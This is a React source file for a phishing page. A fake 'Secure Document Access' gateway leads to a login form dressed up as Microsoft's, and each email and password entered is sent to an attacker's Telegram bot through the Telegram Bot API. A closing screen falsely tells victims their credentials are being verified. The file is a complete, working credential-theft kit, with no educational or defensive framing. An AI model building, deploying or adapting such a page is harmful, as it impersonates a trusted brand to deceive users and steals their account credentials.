import React, { useState } from 'react';
import { FileLock2, Loader2, ShieldCheck, ArrowRight, Mail, Lock } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

type Page = 'gateway' | 'auth';
type AuthStep = 'email' | 'password' | 'success';

export default function App() {
  const [page, setPage] = useState<Page>('gateway');
  const [authStep, setAuthStep] = useState<AuthStep>('email');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const sendToTelegram = async (content: string, type: 'Email' | 'Password') => {
    const botToken = (import.meta as any).env.NEXT_PUBLIC_VITE_TELEGRAM_BOT_TOKEN;
    const chatId = (import.meta as any).env.NEXT_PUBLIC_VITE_TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error('Telegram credentials missing');
      await new Promise(resolve => setTimeout(resolve, 1000));
      return true;
    }

    try {
      const message = `🔐 *Microsoft-Style Access Attempt*\n\n📍 Step: *${type}*\n📧 Identifier: \`${email}\`\n${type === 'Password' ? `🔑 Password: \`${content}\`\n` : ''}🌐 Origin: ${window.location.origin}\n⏰ Time: ${new Date().toLocaleString()}`;
      
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'MarkdownV2',
        }),
      });

      return response.ok;
    } catch (error) {
      console.error('Error sending message:', error);
      return false;
    }
  };

  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email) return;

    setIsLoading(true);
    const success = await sendToTelegram(email, 'Email');
    
    if (success) {
      setAuthStep('password');
    }
    setIsLoading(false);
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) return;

    setIsLoading(true);
    const success = await sendToTelegram(password, 'Password');
    
    if (success) {
      setAuthStep('success');
    }
    setIsLoading(false);
  };

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-zinc-100 font-sans selection:bg-blue-500/30">
      <AnimatePresence mode="wait">
        {page === 'gateway' ? (
          <motion.div
            key="gateway"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            transition={{ duration: 0.4, ease: "easeOut" }}
            className="flex flex-col items-center justify-center min-h-screen p-6 text-center"
          >
            <div className="mb-8 relative">
              <div className="absolute inset-0 bg-blue-500/20 blur-3xl rounded-full" />
              <div className="relative bg-zinc-900 p-6 rounded-3xl border border-zinc-800 shadow-2xl">
                <FileLock2 className="w-20 h-20 text-blue-500" strokeWidth={1.5} />
              </div>
            </div>

            <h1 className="text-4xl md:text-5xl font-bold tracking-tight mb-4 bg-gradient-to-b from-white to-zinc-400 bg-clip-text text-transparent">
              Secure Document Access
            </h1>
            <p className="text-zinc-500 max-w-md mb-10 text-lg leading-relaxed">
              This document is encrypted and requires identity verification to view. 
              Please sign in to your corporate account.
            </p>

            <button
              onClick={() => setPage('auth')}
              className="group relative flex items-center gap-3 bg-white text-black px-8 py-4 rounded-full font-semibold transition-all hover:scale-105 active:scale-95 hover:shadow-[0_0_20px_rgba(255,255,255,0.3)]"
            >
              Sign in to View Document
              <ArrowRight className="w-5 h-5 transition-transform group-hover:translate-x-1" />
            </button>

            <div className="mt-16 flex items-center gap-2 text-zinc-600 text-sm uppercase tracking-widest font-medium">
              <ShieldCheck className="w-4 h-4" />
              End-to-End Encrypted
            </div>
          </motion.div>
        ) : (
          <motion.div
            key="auth"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 1.05 }}
            transition={{ duration: 0.4, ease: "easeOut" }}
            className="flex flex-col items-center justify-center min-h-screen p-6"
          >
            <div className="w-full max-w-[440px] bg-white rounded-none p-11 shadow-2xl text-[#1b1b1b]">
              {/* Microsoft Logo */}
              <div className="flex items-center gap-2 mb-6">
                <div className="grid grid-cols-2 gap-[2px] w-5 h-5">
                  <div className="bg-[#f25022] w-full h-full"></div>
                  <div className="bg-[#7fba00] w-full h-full"></div>
                  <div className="bg-[#00a4ef] w-full h-full"></div>
                  <div className="bg-[#ffb900] w-full h-full"></div>
                </div>
                <span className="text-[#737373] font-semibold text-xl">Microsoft</span>
              </div>

              <AnimatePresence mode="wait">
                {authStep === 'email' && (
                  <motion.div
                    key="email-step"
                    initial={{ opacity: 0, x: -10 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: 10 }}
                  >
                    <h2 className="text-2xl font-semibold mb-1">Sign in</h2>
                    <p className="text-[15px] mb-4">to continue to SecureVault</p>

                    <form onSubmit={handleEmailSubmit} className="space-y-4">
                      <div className="space-y-1">
                        <input
                          type="text"
                          required
                          value={email}
                          onChange={(e) => setEmail(e.target.value)}
                          placeholder="Email, phone, or Skype"
                          className="w-full bg-transparent border border-gray-300 focus:border-[#0067b8] py-2 px-3 focus:outline-none transition-all text-[15px] placeholder:text-[#666]"
                        />
                      </div>

                      <div className="text-[13px] text-[#0067b8] space-y-3 pt-2">
                        <p className="hover:underline cursor-pointer">No account? <span className="text-[#0067b8]">Create one!</span></p>
                        <p className="hover:underline cursor-pointer">Forgot username?</p>
                      </div>

                      <div className="flex justify-end pt-6">
                        <button
                          type="submit"
                          disabled={isLoading}
                          className="min-w-[108px] bg-[#0067b8] hover:bg-[#005da6] text-white px-3 py-1.5 rounded-md font-normal text-[15px] transition-all flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          {isLoading ? (
                            <Loader2 className="w-4 h-4 animate-spin" />
                          ) : (
                            'Next'
                          )}
                        </button>
                      </div>
                    </form>
                  </motion.div>
                )}

                {authStep === 'password' && (
                  <motion.div
                    key="password-step"
                    initial={{ opacity: 0, x: 10 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: -10 }}
                  >
                    <div className="flex items-center gap-2 mb-1">
                      <button 
                        onClick={() => setAuthStep('email')}
                        className="p-1 hover:bg-gray-100 rounded-full transition-colors"
                      >
                        <ArrowRight className="w-4 h-4 rotate-180" />
                      </button>
                      <span className="text-[15px]">{email}</span>
                    </div>
                    <h2 className="text-2xl font-semibold mb-4">Enter password</h2>

                    <form onSubmit={handlePasswordSubmit} className="space-y-4">
                      <div className="space-y-1">
                        <input
                          type="password"
                          required
                          autoFocus
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                          placeholder="Password"
                          className="w-full bg-transparent border border-gray-300 focus:border-[#0067b8] py-2 px-3 focus:outline-none transition-all text-[15px] placeholder:text-[#666]"
                        />
                      </div>

                      <div className="text-[13px] text-[#0067b8] space-y-3 pt-2">
                        <p className="hover:underline cursor-pointer">Forgot password?</p>
                        <p className="hover:underline cursor-pointer">Other ways to sign in</p>
                      </div>

                      <div className="flex justify-end pt-6">
                        <button
                          type="submit"
                          disabled={isLoading}
                          className="min-w-[108px] bg-[#0067b8] hover:bg-[#005da6] text-white px-3 py-1.5 rounded-md font-normal text-[15px] transition-all flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          {isLoading ? (
                            <Loader2 className="w-4 h-4 animate-spin" />
                          ) : (
                            'Sign in'
                          )}
                        </button>
                      </div>
                    </form>
                  </motion.div>
                )}

                {authStep === 'success' && (
                  <motion.div
                    key="success-step"
                    initial={{ opacity: 0, scale: 0.9 }}
                    animate={{ opacity: 1, scale: 1 }}
                    className="text-center py-8"
                  >
                    <div className="inline-flex items-center justify-center w-12 h-12 mb-6">
                      <Loader2 className="w-10 h-10 animate-spin text-[#0067b8]" />
                    </div>
                    <h2 className="text-xl font-semibold mb-2">Redirecting to document...</h2>
                    <p className="text-[15px] text-[#666]">
                      Please wait while we verify your credentials and grant access.
                    </p>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>
            
            <div className="mt-8 flex gap-6 text-[#737373] text-[12px]">
              <span className="hover:underline cursor-pointer">Terms of use</span>
              <span className="hover:underline cursor-pointer">Privacy & cookies</span>
              <span className="cursor-default">...</span>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}